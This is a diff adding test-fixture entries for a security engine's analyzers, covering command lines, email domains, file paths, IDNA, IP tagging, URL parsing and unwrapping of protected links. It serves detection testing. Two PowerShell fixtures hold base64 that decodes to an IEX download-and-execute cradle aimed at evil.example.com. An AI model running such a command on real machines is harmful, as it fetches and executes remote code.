@@ -535,6 +535,114 @@
     },
     {
       "ace3_commit": "f72f8946",
+      "analysis": "CommandLineAnalysis",
+      "dump": "command_line_analyzer/encoded_dash.json",
+      "input": "command_line C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe \u2013ExecutionPolicy Bypass \u2013EncodedCommand VwByAGkAdABlAC0ASABvAHMAdAAgAGgAZQBsAGwAbwA=",
+      "module": "command_line_analyzer",
+      "observables_added": 2,
+      "summary": "Command Line Analysis: extracted  1 file paths, 1 base64 payloads"
+    },
+    {
+      "ace3_commit": "f72f8946",
+      "analysis": "CommandLineAnalysis",
+      "dump": "command_line_analyzer/encoded_short.json",
+      "input": "command_line powershell.exe -NoProfile -enc VwByAGkAdABlAC0ASABvAHMAdAAgAGgAZQBsAGwAbwA=",
+      "module": "command_line_analyzer",
+      "observables_added": 1,
+      "summary": "Command Line Analysis: extracted  1 base64 payloads"
+    },
+    {
+      "ace3_commit": "f72f8946",
+      "analysis": "CommandLineAnalysis",
+      "dump": "command_line_analyzer/escaped_quotes.json",
+      "input": "command_line powershell.exe -Command \"Start-Process \\\"C:\\Program Files\\Evil Corp\\e.exe\\\" -ArgumentList \\\"\\\\srv\\s\\p q.txt\\\"\"",
+      "module": "command_line_analyzer",
+      "observables_added": 2,
+      "summary": "Command Line Analysis: extracted  2 file paths"
+    },
+    {
+      "ace3_commit": "f72f8946",
+      "analysis": "CommandLineAnalysis",
+      "dump": "command_line_analyzer/executed_on.json",
+      "input": "command_line \"C:\\Users\\bob\\Downloads\\invoice.exe\" /silent with ['collect_file'], executed_on hostname WS-0042",
+      "module": "command_line_analyzer",
+      "observables_added": 2,
+      "summary": "Command Line Analysis: extracted  1 file paths"
+    },
+    {
+      "ace3_commit": "f72f8946",
+      "analysis": "CommandLineAnalysis",
+      "dump": "command_line_analyzer/long_payload.json",
+      "input": "command_line pwsh -c \"Invoke-Thing SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAiAGgAdAB0AHAAOgAvAC8AZQB2AGkAbAAuAGUAeABhAG0AcABsAGUALgBjAG8AbQAvAGEALgBwAHMAMQAiACkAOwAgAEkARQBYACAAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4ARABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAIgBoAHQAdABwADoALwAvAGUAdgBpAGwALgBlAHgAYQBtAHAAbABlAC4AYwBvAG0ALwBhAC4AcABzADEAIgApADsAIAA=\"",
+      "module": "command_line_analyzer",
+      "observables_added": 1,
+      "summary": "Command Line Analysis: extracted  1 base64 payloads"
+    },
+    {
+      "ace3_commit": "f72f8946",
+      "analysis": "CommandLineAnalysis",
+      "dump": "command_line_analyzer/not_powershell.json",
+      "input": "command_line docker run -e VwByAGkAdABlAC0ASABvAHMAdAAgAGgAZQBsAGwAbwA= alpine",
+      "module": "command_line_analyzer",
+      "observables_added": 0,
+      "summary": null
+    },
+    {
+      "ace3_commit": "f72f8946",
+      "analysis": "CommandLineAnalysis",
+      "dump": "command_line_analyzer/nothing.json",
+      "input": "command_line whoami /all",
+      "module": "command_line_analyzer",
+      "observables_added": 0,
+      "summary": null
+    },
+    {
+      "ace3_commit": "f72f8946",
+      "analysis": "CommandLineAnalysis",
+      "dump": "command_line_analyzer/paths.json",
+      "input": "command_line cmd.exe /c \"C:\\Program Files\\Acme Tool\\run.exe\" -o C:\\Users\\alice\\AppData\\Local\\Temp\\out.log \\\\fileserver\\share\\drop\\x.dll",
+      "module": "command_line_analyzer",
+      "observables_added": 3,
+      "summary": "Command Line Analysis: extracted  3 file paths"
+    },
+    {
+      "ace3_commit": "f72f8946",
+      "analysis": "CommandLineAnalysis",
+      "dump": "command_line_analyzer/prefix.json",
+      "input": "command_line cmd /c start \"\" \"C:\\Program Files\\App\\a.exe\" & C:\\Program Files\\App\\a.exe",
+      "module": "command_line_analyzer",
+      "observables_added": 1,
+      "summary": "Command Line Analysis: extracted  1 file paths"
+    },
+    {
+      "ace3_commit": "f72f8946",
+      "analysis": "CommandLineAnalysis",
+      "dump": "command_line_analyzer/two_payloads.json",
+      "input": "command_line powershell -enc VwByAGkAdABlAC0ASABvAHMAdAAgAGgAZQBsAGwAbwA= -ec VwByAGkAdABlAC0ASABvAHMAdAAgAGIAeQBlAA==",
+      "module": "command_line_analyzer",
+      "observables_added": 2,
+      "summary": "Command Line Analysis: extracted  2 base64 payloads"
+    },
+    {
+      "ace3_commit": "f72f8946",
+      "analysis": "CommandLineAnalysis",
+      "dump": "command_line_analyzer/unbalanced.json",
+      "input": "command_line powershell -Command \"& 'C:\\Tools\\a b\\x.ps1' SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAiAGgAdAB0AHAAOgAvAC8AZQB2AGkAbAAuAGUAeABhAG0AcABsAGUALgBjAG8AbQAvAGEALgBwAHMAMQAiACkAOwAgAEkARQBYACAAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4ARABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAIgBoAHQAdABwADoALwAvAGUAdgBpAGwALgBlAHgAYQBtAHAAbABlAC4AYwBvAG0ALwBhAC4AcABzADEAIgApADsAIAA=",
+      "module": "command_line_analyzer",
+      "observables_added": 1,
+      "summary": "Command Line Analysis: extracted  1 base64 payloads"
+    },
+    {
+      "ace3_commit": "f72f8946",
+      "analysis": "CommandLineAnalysis",
+      "dump": "command_line_analyzer/urlsafe.json",
+      "input": "command_line loader.exe /data AAECAwQFBgcICQoLDA0ODxAREhMUFRYXGBkaGxwdHh8gISIjJCUmJygpKissLS4vMDEyMzQ1Njc4OTo7PD0-P0BBQkNERUZHSElKS0xNTk9QUVJTVFVWV1hZWltcXV5fYGFiY2RlZmdoaWprbG1ub3BxcnN0dXZ3eHl6e3x9fn-AgYKDhIWGh4iJiouMjY6PkJGSk5SVlpeYmZqbnJ2en6ChoqOkpaanqKmqq6ytrq-wsbKztLW2t7i5uru8vb6_wMHCw8TFxsc /quiet",
+      "module": "command_line_analyzer",
+      "observables_added": 1,
+      "summary": "Command Line Analysis: extracted  1 base64 payloads"
+    },
+    {
+      "ace3_commit": "f72f8946",
       "analysis": "DHashImageAnalysis",
       "dump": "dhash/brand.gif.json",
       "input": "fixtures/dhash/images/brand.gif with dhash",
@@ -613,6 +721,60 @@
       "module": "dhash",
       "observables_added": 0,
       "summary": null
+    },
+    {
+      "ace3_commit": "f72f8946",
+      "analysis": "EmailAddressFQDNAnalysis",
+      "dump": "email_address_fqdn_analyzer/display_name.json",
+      "input": "email_address \"Bob\" <bob@Sub.Example.ORG>",
+      "module": "email_address_fqdn_analyzer",
+      "observables_added": 1,
+      "summary": "Email Address FQDN: sub.example.org"
+    },
+    {
+      "ace3_commit": "f72f8946",
+      "analysis": "EmailAddressFQDNAnalysis",
+      "dump": "email_address_fqdn_analyzer/email_from.json",
+      "input": "email_from carol@example.net",
+      "module": "email_address_fqdn_analyzer",
+      "observables_added": 1,
+      "summary": "Email Address FQDN: example.net"
+    },
+    {
+      "ace3_commit": "f72f8946",
+      "analysis": "EmailAddressFQDNAnalysis",
+      "dump": "email_address_fqdn_analyzer/literal.json",
+      "input": "email_address user@[192.0.2.1]",
+      "module": "email_address_fqdn_analyzer",
+      "observables_added": 0,
+      "summary": "Email Address FQDN: [192.0.2.1]"
+    },
+    {
+      "ace3_commit": "f72f8946",
+      "analysis": "EmailAddressFQDNAnalysis",
+      "dump": "email_address_fqdn_analyzer/plain.json",
+      "input": "email_address alice@example.com",
+      "module": "email_address_fqdn_analyzer",
+      "observables_added": 1,
+      "summary": "Email Address FQDN: example.com"
+    },
+    {
+      "ace3_commit": "f72f8946",
+      "analysis": "EmailAddressFQDNAnalysis",
+      "dump": "email_address_fqdn_analyzer/two_ats.json",
+      "input": "email_address weird@@x.com",
+      "module": "email_address_fqdn_analyzer",
+      "observables_added": 0,
+      "summary": "Email Address FQDN: @x.com"
+    },
+    {
+      "ace3_commit": "f72f8946",
+      "analysis": "EmailAddressFQDNAnalysis",
+      "dump": "email_address_fqdn_analyzer/unicode.json",
+      "input": "email_address x@m\u00fcnchen.de",
+      "module": "email_address_fqdn_analyzer",
+      "observables_added": 1,
+      "summary": "Email Address FQDN: m\u00fcnchen.de"
     },
     {
       "ace3_commit": "844e3584",
@@ -1651,6 +1813,105 @@
     },
     {
       "ace3_commit": "f72f8946",
+      "analysis": "FileLocationAnalysis",
+      "dump": "file_location_analysis/spaces.json",
+      "input": "file_location  HOST @ C:\\x",
+      "module": "file_location_analysis",
+      "observables_added": 2,
+      "summary": "File Location Analysis: hostname  HOST  file path  C:\\x"
+    },
+    {
+      "ace3_commit": "f72f8946",
+      "analysis": "FileLocationAnalysis",
+      "dump": "file_location_analysis/two_ats.json",
+      "input": "file_location host@/var/tmp/x@y",
+      "module": "file_location_analysis",
+      "observables_added": 2,
+      "summary": "File Location Analysis: hostname host file path /var/tmp/x@y"
+    },
+    {
+      "ace3_commit": "f72f8946",
+      "analysis": "FileLocationAnalysis",
+      "dump": "file_location_analysis/windows.json",
+      "input": "file_location WS-0042@C:\\Windows\\Temp\\a.exe",
+      "module": "file_location_analysis",
+      "observables_added": 2,
+      "summary": "File Location Analysis: hostname WS-0042 file path C:\\Windows\\Temp\\a.exe"
+    },
+    {
+      "ace3_commit": "f72f8946",
+      "analysis": null,
+      "dump": "file_path_analysis/bare_name.json",
+      "input": "file_path notes.txt",
+      "module": "file_path_analysis",
+      "observables_added": 0,
+      "summary": null
+    },
+    {
+      "ace3_commit": "f72f8946",
+      "analysis": "FilePathAnalysis",
+      "dump": "file_path_analysis/blank_user.json",
+      "input": "file_path C:\\Users\\  \\file.txt",
+      "module": "file_path_analysis",
+      "observables_added": 1,
+      "summary": "File Path Analysis: file name file.txt user name   "
+    },
+    {
+      "ace3_commit": "f72f8946",
+      "analysis": "FilePathAnalysis",
+      "dump": "file_path_analysis/forward_slashes.json",
+      "input": "file_path C:/Users/dan/file.txt",
+      "module": "file_path_analysis",
+      "observables_added": 1,
+      "summary": "File Path Analysis: file name file.txt"
+    },
+    {
+      "ace3_commit": "f72f8946",
+      "analysis": "FilePathAnalysis",
+      "dump": "file_path_analysis/no_user_dir.json",
+      "input": "file_path C:\\Users\\carol",
+      "module": "file_path_analysis",
+      "observables_added": 1,
+      "summary": "File Path Analysis: file name carol"
+    },
+    {
+      "ace3_commit": "f72f8946",
+      "analysis": "FilePathAnalysis",
+      "dump": "file_path_analysis/trailing_separator.json",
+      "input": "file_path c:\\USERS\\Bob Smith\\Desktop\\",
+      "module": "file_path_analysis",
+      "observables_added": 1,
+      "summary": "File Path Analysis: user name Bob Smith"
+    },
+    {
+      "ace3_commit": "f72f8946",
+      "analysis": "FilePathAnalysis",
+      "dump": "file_path_analysis/unc.json",
+      "input": "file_path \\\\server\\share\\dir\\payload.dll",
+      "module": "file_path_analysis",
+      "observables_added": 1,
+      "summary": "File Path Analysis: file name payload.dll"
+    },
+    {
+      "ace3_commit": "f72f8946",
+      "analysis": "FilePathAnalysis",
+      "dump": "file_path_analysis/unix.json",
+      "input": "file_path /usr/local/bin/script.sh",
+      "module": "file_path_analysis",
+      "observables_added": 1,
+      "summary": "File Path Analysis: file name script.sh"
+    },
+    {
+      "ace3_commit": "f72f8946",
+      "analysis": "FilePathAnalysis",
+      "dump": "file_path_analysis/user_path.json",
+      "input": "file_path C:\\Users\\alice\\AppData\\Roaming\\evil.exe",
+      "module": "file_path_analysis",
+      "observables_added": 2,
+      "summary": "File Path Analysis: file name evil.exe user name alice"
+    },
+    {
+      "ace3_commit": "f72f8946",
       "analysis": "FileTypeAnalysis",
       "dump": "file_type/ace4/js/broken.js.json",
       "input": "ace4/js/broken.js",
@@ -2083,6 +2344,87 @@
     },
     {
       "ace3_commit": "f72f8946",
+      "analysis": null,
+      "dump": "idna_analyzer/ascii.json",
+      "input": "fqdn example.com",
+      "module": "idna_analyzer",
+      "observables_added": 0,
+      "summary": null
+    },
+    {
+      "ace3_commit": "f72f8946",
+      "analysis": null,
+      "dump": "idna_analyzer/bad_punycode.json",
+      "input": "fqdn xn--a.com",
+      "module": "idna_analyzer",
+      "observables_added": 0,
+      "summary": null
+    },
+    {
+      "ace3_commit": "f72f8946",
+      "analysis": "IDNAAnalysis",
+      "dump": "idna_analyzer/punycode.json",
+      "input": "fqdn xn--mnchen-3ya.de",
+      "module": "idna_analyzer",
+      "observables_added": 1,
+      "summary": "IDNA: idna=xn--mnchen-3ya.de, unicode=m\u00fcnchen.de"
+    },
+    {
+      "ace3_commit": "f72f8946",
+      "analysis": "IDNAAnalysis",
+      "dump": "idna_analyzer/sharp_s.json",
+      "input": "fqdn fa\u00df.de",
+      "module": "idna_analyzer",
+      "observables_added": 1,
+      "summary": "IDNA: idna=xn--fa-hia.de, unicode=fa\u00df.de"
+    },
+    {
+      "ace3_commit": "f72f8946",
+      "analysis": "IDNAAnalysis",
+      "dump": "idna_analyzer/sharp_s_punycode.json",
+      "input": "fqdn xn--fa-hia.de",
+      "module": "idna_analyzer",
+      "observables_added": 1,
+      "summary": "IDNA: idna=xn--fa-hia.de, unicode=fa\u00df.de"
+    },
+    {
+      "ace3_commit": "f72f8946",
+      "analysis": "IDNAAnalysis",
+      "dump": "idna_analyzer/snowman.json",
+      "input": "fqdn \u2603.net",
+      "module": "idna_analyzer",
+      "observables_added": 1,
+      "summary": "IDNA: idna=xn--n3h.net, unicode=\u2603.net"
+    },
+    {
+      "ace3_commit": "f72f8946",
+      "analysis": "IDNAAnalysis",
+      "dump": "idna_analyzer/unicode.json",
+      "input": "fqdn m\u00fcnchen.de",
+      "module": "idna_analyzer",
+      "observables_added": 1,
+      "summary": "IDNA: idna=xn--mnchen-3ya.de, unicode=m\u00fcnchen.de"
+    },
+    {
+      "ace3_commit": "f72f8946",
+      "analysis": null,
+      "dump": "idna_analyzer/upper_ascii.json",
+      "input": "fqdn EXAMPLE.com",
+      "module": "idna_analyzer",
+      "observables_added": 0,
+      "summary": null
+    },
+    {
+      "ace3_commit": "f72f8946",
+      "analysis": "IDNAAnalysis",
+      "dump": "idna_analyzer/upper_unicode.json",
+      "input": "fqdn B\u00fccher.Example",
+      "module": "idna_analyzer",
+      "observables_added": 1,
+      "summary": "IDNA: idna=xn--bcher-kva.example, unicode=b\u00fccher.example"
+    },
+    {
+      "ace3_commit": "f72f8946",
       "analysis": "IOCExtractionAnalysis",
       "dump": "ioc_extraction/empty_iocs.txt.json",
       "input": "fixtures/iocs/empty_iocs.txt with extract_iocs",
@@ -2152,6 +2494,78 @@
       "module": "lnk_parser",
       "observables_added": 1,
       "summary": "LnkParse Analysis: target path: (C:\\Windows\\notepad.exe), command line arguments: (/c echo hi), icon location: (%SystemRoot%\\system32\\shell32.dll), working directory: (C:\\Windows)"
+    },
+    {
+      "ace3_commit": "f72f8946",
+      "analysis": "NetworkIdentifierAnalysis",
+      "dump": "network_identifier/default_file.json",
+      "input": "ip 10.0.0.1",
+      "module": "network_identifier",
+      "observables_added": 0,
+      "summary": null
+    },
+    {
+      "ace3_commit": "f72f8946",
+      "analysis": "NetworkIdentifierAnalysis",
+      "dump": "network_identifier/ipv6.json",
+      "input": "ip 2001:db8::5",
+      "module": "network_identifier",
+      "observables_added": 1,
+      "summary": "Network Identification Analysis: ipv6 lab"
+    },
+    {
+      "ace3_commit": "f72f8946",
+      "analysis": "NetworkIdentifierAnalysis",
+      "dump": "network_identifier/mapped.json",
+      "input": "ip ::ffff:10.1.2.3",
+      "module": "network_identifier",
+      "observables_added": 1,
+      "summary": "Network Identification Analysis: corporate, lab"
+    },
+    {
+      "ace3_commit": "f72f8946",
+      "analysis": "NetworkIdentifierAnalysis",
+      "dump": "network_identifier/none.json",
+      "input": "ip 8.8.8.8",
+      "module": "network_identifier",
+      "observables_added": 0,
+      "summary": null
+    },
+    {
+      "ace3_commit": "f72f8946",
+      "analysis": "NetworkIdentifierAnalysis",
+      "dump": "network_identifier/scoped.json",
+      "input": "ip fe80::1%eth0",
+      "module": "network_identifier",
+      "observables_added": 0,
+      "summary": null
+    },
+    {
+      "ace3_commit": "f72f8946",
+      "analysis": "NetworkIdentifierAnalysis",
+      "dump": "network_identifier/single.json",
+      "input": "ipv4 172.16.5.4",
+      "module": "network_identifier",
+      "observables_added": 1,
+      "summary": "Network Identification Analysis: printer"
+    },
+    {
+      "ace3_commit": "f72f8946",
+      "analysis": "NetworkIdentifierAnalysis",
+      "dump": "network_identifier/subnet.json",
+      "input": "ip 192.168.1.5",
+      "module": "network_identifier",
+      "observables_added": 1,
+      "summary": "Network Identification Analysis: branch office"
+    },
+    {
+      "ace3_commit": "f72f8946",
+      "analysis": "NetworkIdentifierAnalysis",
+      "dump": "network_identifier/two_networks.json",
+      "input": "ip 10.1.2.3",
+      "module": "network_identifier",
+      "observables_added": 1,
+      "summary": "Network Identification Analysis: corporate, lab"
     },
     {
       "ace3_commit": "f72f8946",
@@ -2242,6 +2656,321 @@
       "module": "nrd_analyzer",
       "observables_added": 0,
       "summary": "Newly Registered Domain: present in local NRD list (registered 7 day(s) ago)"
+    },
+    {
+      "ace3_commit": "f72f8946",
+      "analysis": "ParseURLAnalysis",
+      "dump": "parse_url/bare_host.json",
+      "input": "url ftp://example.org",
+      "module": "parse_url",
+      "observables_added": 1,
+      "summary": "URL Parser: scheme=ftp, netloc=example.org"
+    },
+    {
+      "ace3_commit": "f72f8946",
+      "analysis": "ParseURLAnalysis",
+      "dump": "parse_url/full.json",
+      "input": "url https://www.example.com/path/to?a=1&b=%20x+y#frag",
+      "module": "parse_url",
+      "observables_added": 2,
+      "summary": "URL Parser: scheme=https, netloc=www.example.com, path=/path/to, query=a=1&b=%20x+y, params=(a=1, b= x y), fragment=frag"
+    },
+    {
+      "ace3_commit": "f72f8946",
+      "analysis": "ParseURLAnalysis",
+      "dump": "parse_url/host_first.json",
+      "input": "url yahoo.com/login",
+      "module": "parse_url",
+      "observables_added": 2,
+      "summary": "URL Parser: netloc=yahoo.com, path=/login"
+    },
+    {
+      "ace3_commit": "f72f8946",
+      "analysis": "ParseURLAnalysis",
+      "dump": "parse_url/host_port_first.json",
+      "input": "url yahoo.com:8080/login",
+      "module": "parse_url",
+      "observables_added": 2,
+      "summary": "URL Parser: netloc=yahoo.com:8080, path=/login"
+    },
+    {
+      "ace3_commit": "f72f8946",
+      "analysis": "ParseURLAnalysis",
+      "dump": "parse_url/ip_first.json",
+      "input": "url 10.1.2.3/admin",
+      "module": "parse_url",
+      "observables_added": 2,
+      "summary": "URL Parser: netloc=10.1.2.3, path=/admin"
+    },
+    {
+      "ace3_commit": "f72f8946",
+      "analysis": "ParseURLAnalysis",
+      "dump": "parse_url/ipv4_port.json",
+      "input": "url http://192.0.2.10:8080/login",
+      "module": "parse_url",
+      "observables_added": 2,
+      "summary": "URL Parser: scheme=http, netloc=192.0.2.10:8080, path=/login"
+    },
+    {
+      "ace3_commit": "f72f8946",
+      "analysis": "ParseURLAnalysis",
+      "dump": "parse_url/ipv6.json",
+      "input": "url https://[2001:db8::1]/x",
+      "module": "parse_url",
+      "observables_added": 2,
+      "summary": "URL Parser: scheme=https, netloc=[2001:db8::1], path=/x"
+    },
+    {
+      "ace3_commit": "f72f8946",
+      "analysis": "ParseURLAnalysis",
+      "dump": "parse_url/localhost.json",
+      "input": "url https://localhost/x",
+      "module": "parse_url",
+      "observables_added": 1,
+      "summary": "URL Parser: scheme=https, netloc=localhost, path=/x"
+    },
+    {
+      "ace3_commit": "f72f8946",
+      "analysis": "ParseURLAnalysis",
+      "dump": "parse_url/mailto.json",
+      "input": "url mailto:bob@example.com",
+      "module": "parse_url",
+      "observables_added": 1,
+      "summary": "URL Parser: scheme=mailto, path=bob@example.com"
+    },
+    {
+      "ace3_commit": "f72f8946",
+      "analysis": "ParseURLAnalysis",
+      "dump": "parse_url/relative.json",
+      "input": "url /relative/path",
+      "module": "parse_url",
+      "observables_added": 1,
+      "summary": "URL Parser: path=/relative/path"
+    },
+    {
+      "ace3_commit": "f72f8946",
+      "analysis": "ParseURLAnalysis",
+      "dump": "parse_url/repeated_params.json",
+      "input": "url https://example.com/?a=1&a=2&b&c=%2B+",
+      "module": "parse_url",
+      "observables_added": 2,
+      "summary": "URL Parser: scheme=https, netloc=example.com, path=/, query=a=1&a=2&b&c=%2B+, params=(a=2, b=, c=  )"
+    },
+    {
+      "ace3_commit": "f72f8946",
+      "analysis": "ParseURLAnalysis",
+      "dump": "parse_url/unicode.json",
+      "input": "url https://m\u00fcnchen.de/\u00fc?q=\u00e4",
+      "module": "parse_url",
+      "observables_added": 2,
+      "summary": "URL Parser: scheme=https, netloc=m\u00fcnchen.de, path=/\u00fc, query=q=\u00e4, params=(q=\u00e4)"
+    },
+    {
+      "ace3_commit": "f72f8946",
+      "analysis": "ParseURLAnalysis",
+      "dump": "parse_url/userinfo.json",
+      "input": "url https://user:pass@host.example.co.uk/",
+      "module": "parse_url",
+      "observables_added": 1,
+      "summary": "URL Parser: scheme=https, netloc=user:pass@host.example.co.uk"
+    },
+    {
+      "ace3_commit": "f72f8946",
+      "analysis": "ParseURLAnalysis",
+      "dump": "parse_url/word.json",
+      "input": "url example",
+      "module": "parse_url",
+      "observables_added": 1,
+      "summary": "URL Parser: path=example"
+    },
+    {
+      "ace3_commit": "f72f8946",
+      "analysis": "ProtectedURLAnalysis",
+      "dump": "protected_url_analyzer/cisco.json",
+      "input": "url https://secure-web.cisco.com/1abcdef/https%3A%2F%2Fevil.example.com%2Fx",
+      "module": "protected_url_analyzer",
+      "observables_added": 1,
+      "summary": "Protected URL Analysis: detected type cisco extracted url https://evil.example.com/x"
+    },
+    {
+      "ace3_commit": "f72f8946",
+      "analysis": "ProtectedURLAnalysis",
+      "dump": "protected_url_analyzer/cudasvc.json",
+      "input": "url https://linkprotect.cudasvc.com/url?a=https%3a%2f%2fevil.example.com%2fx&c=E,1",
+      "module": "protected_url_analyzer",
+      "observables_added": 1,
+      "summary": "Protected URL Analysis: detected type cudasvc extracted url https://evil.example.com/x"
+    },
+    {
+      "ace3_commit": "f72f8946",
+      "analysis": "ProtectedURLAnalysis",
+      "dump": "protected_url_analyzer/dropbox_dl0.json",
+      "input": "url https://www.dropbox.com/s/abc/file.pdf?dl=0",
+      "module": "protected_url_analyzer",
+      "observables_added": 1,
+      "summary": "Protected URL Analysis: detected type dropbox extracted url https://www.dropbox.com/s/abc/file.pdf?dl=1"
+    },
+    {
+      "ace3_commit": "f72f8946",
+      "analysis": "ProtectedURLAnalysis",
+      "dump": "protected_url_analyzer/dropbox_dl1.json",
+      "input": "url https://www.dropbox.com/s/abc/file.pdf?dl=1",
+      "module": "protected_url_analyzer",
+      "observables_added": 0,
+      "summary": null
+    },
+    {
+      "ace3_commit": "f72f8946",
+      "analysis": "ProtectedURLAnalysis",
+      "dump": "protected_url_analyzer/dropbox_no_dl.json",
+      "input": "url https://www.dropbox.com/s/abc/file.pdf?x=1&x=2#top",
+      "module": "protected_url_analyzer",
+      "observables_added": 1,
+      "summary": "Protected URL Analysis: detected type dropbox extracted url https://www.dropbox.com/s/abc/file.pdf?x=1&x=2&dl=1#top"
+    },
+    {
+      "ace3_commit": "f72f8946",
+      "analysis": "ProtectedURLAnalysis",
+      "dump": "protected_url_analyzer/egnyte.json",
+      "input": "url https://acme.egnyte.com/dl/AbCdEf/file.pdf",
+      "module": "protected_url_analyzer",
+      "observables_added": 1,
+      "summary": "Protected URL Analysis: detected type egnyte extracted url https://acme.egnyte.com/dd/AbCdEf/file.pdf"
+    },
+    {
+      "ace3_commit": "f72f8946",
+      "analysis": "ProtectedURLAnalysis",
+      "dump": "protected_url_analyzer/egnyte_other.json",
+      "input": "url https://acme.egnyte.com/fl/AbCdEf",
+      "module": "protected_url_analyzer",
+      "observables_added": 0,
+      "summary": null
+    },
+    {
+      "ace3_commit": "f72f8946",
+      "analysis": "ProtectedURLAnalysis",
+      "dump": "protected_url_analyzer/fireeye.json",
+      "input": "url https://protect2.fireeye.com/url?k=abc&u=https://evil.example.com/x",
+      "module": "protected_url_analyzer",
+      "observables_added": 1,
+      "summary": "Protected URL Analysis: detected type fireeye extracted url https://evil.example.com/x"
+    },
+    {
+      "ace3_commit": "f72f8946",
+      "analysis": "ProtectedURLAnalysis",
+      "dump": "protected_url_analyzer/google_drive.json",
+      "input": "url https://drive.google.com/file/d/1ls_eBCsmf3VG_e4dgQiSh_5VUM10b9s2/view?usp=sharing",
+      "module": "protected_url_analyzer",
+      "observables_added": 1,
+      "summary": "Protected URL Analysis: detected type google_drive extracted url https://drive.google.com/uc?authuser=0&id=1ls_eBCsmf3VG_e4dgQiSh_5VUM10b9s2&export=download"
+    },
+    {
+      "ace3_commit": "f72f8946",
+      "analysis": "ProtectedURLAnalysis",
+      "dump": "protected_url_analyzer/one_drive.json",
+      "input": "url https://1drv.ms/b/s!AvqIO0JVRziVa0IWW7c6GG3YkdU",
+      "module": "protected_url_analyzer",
+      "observables_added": 1,
+      "summary": "Protected URL Analysis: detected type one_drive extracted url https://onedrive.live.com/download?authkey=!AEIWW7c6GG3YkdU&resid=95384755423B88FA!107&parId=root&o=OneUp"
+    },
+    {
+      "ace3_commit": "f72f8946",
+      "analysis": "ProtectedURLAnalysis",
+      "dump": "protected_url_analyzer/one_drive_no_params.json",
+      "input": "url https://1drv.ms/u/s!NoParams",
+      "module": "protected_url_analyzer",
+      "observables_added": 0,
+      "summary": null
+    },
+    {
+      "ace3_commit": "f72f8946",
+      "analysis": "ProtectedURLAnalysis",
+      "dump": "protected_url_analyzer/one_drive_unreachable.json",
+      "input": "url https://1drv.ms/f/s!Missing",
+      "module": "protected_url_analyzer",
+      "observables_added": 0,
+      "summary": null
+    },
+    {
+      "ace3_commit": "f72f8946",
+      "analysis": "ProtectedURLAnalysis",
+      "dump": "protected_url_analyzer/plain.json",
+      "input": "url https://www.example.com/",
+      "module": "protected_url_analyzer",
+      "observables_added": 0,
+      "summary": null
+    },
+    {
+      "ace3_commit": "f72f8946",
+      "analysis": "ProtectedURLAnalysis",
+      "dump": "protected_url_analyzer/proofpoint_v2.json",
+      "input": "url https://urldefense.proofpoint.com/v2/url?u=https-3A__evil.example.com_path&d=DwMF&c=x",
+      "module": "protected_url_analyzer",
+      "observables_added": 1,
+      "summary": "Protected URL Analysis: detected type proofpoint extracted url https://evil.example.com/path"
+    },
+    {
+      "ace3_commit": "f72f8946",
+      "analysis": "ProtectedURLAnalysis",
+      "dump": "protected_url_analyzer/safelinks.json",
+      "input": "url https://nam02.safelinks.protection.outlook.com/?url=https%3A%2F%2Fevil.example.com%2Fpage&data=xyz with ['crawl']",
+      "module": "protected_url_analyzer",
+      "observables_added": 1,
+      "summary": "Protected URL Analysis: detected type safelinks_outlook extracted url https://evil.example.com/page"
+    },
+    {
+      "ace3_commit": "f72f8946",
+      "analysis": "ProtectedURLAnalysis",
+      "dump": "protected_url_analyzer/safelinks_no_host.json",
+      "input": "url https://nam02.safelinks.protection.outlook.com/?url=https%3A..&data=xyz",
+      "module": "protected_url_analyzer",
+      "observables_added": 0,
+      "summary": "Protected URL Analysis: detected type safelinks_outlook extracted url https:.."
+    },
+    {
+      "ace3_commit": "f72f8946",
+      "analysis": "ProtectedURLAnalysis",
+      "dump": "protected_url_analyzer/sharepoint.json",
+      "input": "url https://lahia-my.sharepoint.com/:b:/g/personal/secure_onedrivemsw_bid/EVdjoBiqZTxMnjAcDW6yR4gBqJ59ALkT1C2I3L0yb_n0uQ?e=naeXYD",
+      "module": "protected_url_analyzer",
+      "observables_added": 1,
+      "summary": "Protected URL Analysis: detected type sharepoint extracted url https://lahia-my.sharepoint.com/personal/secure_onedrivemsw_bid/_layouts/15/download.aspx?e=naeXYD&share=EVdjoBiqZTxMnjAcDW6yR4gBqJ59ALkT1C2I3L0yb_n0uQ"
+    },
+    {
+      "ace3_commit": "f72f8946",
+      "analysis": "ProtectedURLAnalysis",
+      "dump": "protected_url_analyzer/sophos.json",
+      "input": "url https://eu-central-1.protection.sophos.com?d=x&u=aHR0cHM6Ly9ldmlsLmV4YW1wbGUuY29tL3g=&p=m",
+      "module": "protected_url_analyzer",
+      "observables_added": 1,
+      "summary": "Protected URL Analysis: detected type sophos extracted url https://evil.example.com/x"
+    },
+    {
+      "ace3_commit": "f72f8946",
+      "analysis": "ProtectedURLAnalysis",
+      "dump": "protected_url_analyzer/sophos_bad.json",
+      "input": "url https://eu-central-1.protection.sophos.com?u=a",
+      "module": "protected_url_analyzer",
+      "observables_added": 0,
+      "summary": null
+    },
+    {
+      "ace3_commit": "f72f8946",
+      "analysis": "ProtectedURLAnalysis",
+      "dump": "protected_url_analyzer/unparseable.json",
+      "input": "url http://[::1",
+      "module": "protected_url_analyzer",
+      "observables_added": 0,
+      "summary": null
+    },
+    {
+      "ace3_commit": "f72f8946",
+      "analysis": "ProtectedURLAnalysis",
+      "dump": "protected_url_analyzer/urldefense_v3.json",
+      "input": "url https://urldefense.com/v3/__https://evil.example.com/x__;!!AbC$",
+      "module": "protected_url_analyzer",
+      "observables_added": 1,
+      "summary": "Protected URL Analysis: detected type urldefense extracted url https://evil.example.com/x"
     },
     {
       "ace3_commit": "844e3584",
